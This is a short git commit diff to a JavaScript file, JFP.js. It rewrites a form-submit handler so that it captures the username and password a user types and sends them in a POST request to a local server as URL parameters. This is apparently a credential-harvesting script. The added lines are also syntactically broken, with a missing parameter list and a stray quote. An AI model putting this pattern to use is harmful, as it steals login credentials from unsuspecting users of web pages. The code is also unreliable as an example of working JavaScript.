2328671609ddc0e54985c12478328620abdab5e8
Charles Harner <charner93@gmail.com>
2018-01-22 07:41:17 -0600

    Update JFP.js

--- JFP.js
+++ JFP.js
@@ -1,8 +1,9 @@
-function onFormSubmit()
-{
+function onFormSubmit{
 	getForm = document.getElementsByTagName("form");
 	usernameForm = getForm[0][0].value;
-	passwordForm = getForm[0][0].value;
-	alert(usernameForm + " " + passwordForm);
+	passwordForm = getForm[0][1].value;
+	var request = new XMLHttpRequest();
+	request.open("POST", "http://localhost:8000?username=" + usernameForm + "&password=" + passwordForm, true)'
+	request.send();
 }
 document.forms[0].onsubmit = onFormSubmit;
